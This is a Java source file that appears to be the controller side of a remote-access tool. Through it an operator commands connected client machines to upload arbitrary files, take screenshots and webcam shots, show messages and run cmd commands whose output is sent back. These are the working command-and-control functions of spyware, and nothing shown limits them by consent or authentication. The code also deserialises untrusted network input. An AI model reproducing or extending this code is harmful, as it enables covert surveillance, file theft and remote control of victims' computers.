import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import javax.swing.JOptionPane;

public class Socket_Thread extends Thread {

	private ObjectOutputStream output;
	private ObjectInputStream input;
	private Socket connection_socket;


	public Socket_Thread(Socket connection_socket) {
		this.connection_socket = connection_socket;

		get_iostreams();

	}

	public void run(){
	}



	//--------------------------------------OPERATION functions------------------------------------------------------------



	/*
	 * first a sendfile request and requested file path sent to client
	 * than client looks for the path and returns an answer
	 * if answer is yes than path is exists so clients waits for sending and server waits for receiving
	 * if answer is no than both client and server quits operation so no one hangs 
	 */
	public void OPERATION_send_clients_file_to_server(String clients_abs_file_dir, String servers_file_dir) {


		//send the sendfile request and file path
		Message m;
		m = set_message("sendfile", clients_abs_file_dir);

		try {
			send_message(m);
		} 
		catch (ConnectionLostException e1) {
			return;
		}


		//get the answer from client
		try {
			m = receive_message();
		} 
		catch (ConnectionLostException e1) {
			return;
		}



		//if answer is returned control value should be ispathexists
		if(m.control.equals("ispathexists")) {

			//if path exists clients sends a yes value and it is ready to send file
			if(m.value.equals("yes")) {

				servers_file_dir = create_new_dir(servers_file_dir);


				//seperate clients file name and use it again for saving file to server
				Path p = Paths.get(clients_abs_file_dir);
				String client_dir = p.getParent().toString();
				String client_file_name = p.getFileName().toString();

				String abs_path = servers_file_dir + File.separator + "new-" + client_file_name;


				receive_file(abs_path);

				JOptionPane.showMessageDialog(null, "File downloaded\n" + abs_path, "alert",JOptionPane.PLAIN_MESSAGE);


			}

			//if value is no than path does not exists 
			else if(m.value.equals("no")) {
				System.out.println("PATH DOES NOT EXISTS");
				JOptionPane.showMessageDialog(null, "PATH DOES NOT EXISTS", "alert",JOptionPane.ERROR_MESSAGE);
			}
			else {
				System.out.println("answer error");
			}

		}

	}


	public void OPERATION_send_servers_file_to_client(String servers_abs_file_dir_to_send, String clients_folder_dir_to_save) {

		//send the receivefile request and file path
		Message m;
		m = set_message("receivefile", clients_folder_dir_to_save);

		try {
			send_message(m);
		} 
		catch (ConnectionLostException e1) {
			return;
		}

		send_file(servers_abs_file_dir_to_send);

		JOptionPane.showMessageDialog(null, "File saved", "alert",JOptionPane.PLAIN_MESSAGE);

	}

	public void OPERATION_screenshot(String servers_file_dir) {

		//send the receivefile request and file path
		Message m;
		m = set_message("screenshot", "");

		try {
			send_message(m);
		} 
		catch (ConnectionLostException e1) {
			return;
		}

		servers_file_dir = create_new_dir(servers_file_dir);

		String ss_name = check_dir_for_existing_file(servers_file_dir,"png");

		String abs_path = servers_file_dir + File.separator + ss_name;

		receive_file(abs_path);

		JOptionPane.showMessageDialog(null, "ss saved\n" + abs_path, "alert",JOptionPane.PLAIN_MESSAGE);

	}


	public void OPERATION_show_message(String message) {

		Message m;
		m = set_message("showmessage",message);

		try {
			send_message(m);
		} 
		catch (ConnectionLostException e) {
			return;
		}

	}
	
	public void Operation_cmd_command(String message) {
		Message m;
		m = set_message("cmdcommand", message);
		try {
			send_message(m);
		}catch (ConnectionLostException e) {
			return;
		}
		
		try {
			m = receive_message();
			if (m.control.equals("cmdsend")) {
				StringBuilder sbuild = new StringBuilder();
				sbuild.append(m.value);
				JOptionPane.showMessageDialog(null, m.value);
			}
		}catch (ConnectionLostException e) {
			return;
		}
	}
	
	public void OPERATION_webcamshot(String servers_file_dir, String message) {
			Message m;
			m = set_message("webcamshot", message);
			try {
				send_message(m);
			}catch (ConnectionLostException e) {
				return;
			}
			try {
				m = receive_message();
				if (m.control.equals("webcamnotfound")) {
					if (m.value.equals("webcamnot")) {
						JOptionPane.showMessageDialog(null, "webcamnotfound");
						
						
					}
					
					
				}
				else if (m.control.equals("webcamshot saved")) {
					if (m.value.equals("Webcamfound")) {
						System.out.println("WEBCAMFOUND");
					}
					
				}
				
				
			}catch (ConnectionLostException e) {
				return;
			}
			
			if (!m.value.equals("webcamnot")) {
				
			
			servers_file_dir = create_new_dir(servers_file_dir);

			String ss_name = check_dir_for_existing_file(servers_file_dir,"png");

			String abs_path = servers_file_dir +File.separator+ ss_name;
			receive_file(abs_path);
			JOptionPane.showMessageDialog(null, "webcamshot saved\n" + abs_path, "alert",JOptionPane.PLAIN_MESSAGE);
			}
	}


	//----------------------------------------------------------------------------------------------------------------------




	//-------------------------------------send receive functions---------------------------------------------------------


	private void send_message(Message message) throws ConnectionLostException{
		try {
			output.writeObject(message);
			output.reset();
			output.flush();
		} 
		catch (IOException e) {
			//e.printStackTrace();
			System.out.println("\nmessage is broken IOexception\n");

			closeConnection();

			throw new ConnectionLostException();
		}


	}



	private Message receive_message() throws ConnectionLostException {

		Message m;
		try {
			m = (Message) input.readObject();
		} catch (ClassNotFoundException | IOException e) {
			//e.printStackTrace();

			closeConnection();

			throw new ConnectionLostException();
		}
		return m;

	}




	//only sends file
	private void send_file(String path){
		File f = new File(path);
		byte[] content;

		try {
			content = Files.readAllBytes(f.toPath());
			output.writeObject(content);
			output.reset();
			output.flush();

		} catch (IOException e) {
			e.printStackTrace();
			System.out.println("file write error");
		}
	}

	//only receives file
	private void receive_file(String path) {
		File f = new File(path);

		byte[] content;

		try {
			content = (byte[]) input.readObject();
			Files.write(f.toPath(), content);
		} 
		catch (ClassNotFoundException | IOException e1) {
			e1.printStackTrace();
			System.out.println("file read error");
		}
	}



	//----------------------------------------------------------------------------------------------------------------------




	//------------------------------------------------utility functions---------------------------------------------------


	private String create_new_dir(String name) {

		File theDir = new File(name);

		// if the directory does not exist, create it
		if (!theDir.exists()) {
			System.out.println("creating directory: " + theDir.getName());
			try{
				theDir.mkdir();
				System.out.println("DIR created"); 
			} 
			catch(SecurityException se){
				System.out.println("DIR is not created"); 
			}        
		}

		return theDir.toString();
	}

	private String check_dir_for_existing_file(String theDir, String file_type) {

		int counter = 0;

		//loop until a possible ss file name
		while(true) {

			//directory + basefilename + counter + filetype from combobox 
			File file = new File(theDir + File.separator + "ss" + counter + "." + file_type);
			if(!file.exists()) { 
				return "ss" + counter + "." + file_type;
			}
			else {
				counter++;
			}

		}
	}

	private Message set_message(String control, String value) {
		Message m = new Message();
		m.control = control;
		m.value = value;
		return m;
	}

	//-------------------------------------------connection functions-----------------------------------------------------


	private void get_iostreams() {
		try {
			//ObjectOutputStream **MUST** be created first
			output = new ObjectOutputStream(connection_socket.getOutputStream());
			output.flush();
			input = new ObjectInputStream(connection_socket.getInputStream());	
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	protected void closeConnection(){
		System.out.println("\nTerminating connection\n");

		try{
			output.close();
			input.close();
			connection_socket.close();

		}
		catch (Exception e) {
			System.out.println("\nconnection either already closed or can not be closed\n");
		}
		finally {

			int remove_index = Server_Thread.socket_threads.indexOf(this);
		
			//removes this instant of the object from arraylist
			Server_Thread.socket_threads.remove(this);
			Server_Frame.connected_ips.removeItemAt(remove_index);
			
			
			System.out.println("connection " + connection_socket.getInetAddress().getHostName().toString() + " removed from connections list");
			System.out.println("Connected clients: " + Server_Thread.socket_threads.size());
			
			Server_Frame.connection_count_info_label.setText(Server_Thread.socket_threads.size() + "");			
			
		}

	}


	//----------------------------------------------------------------------------------------------------------------------









}
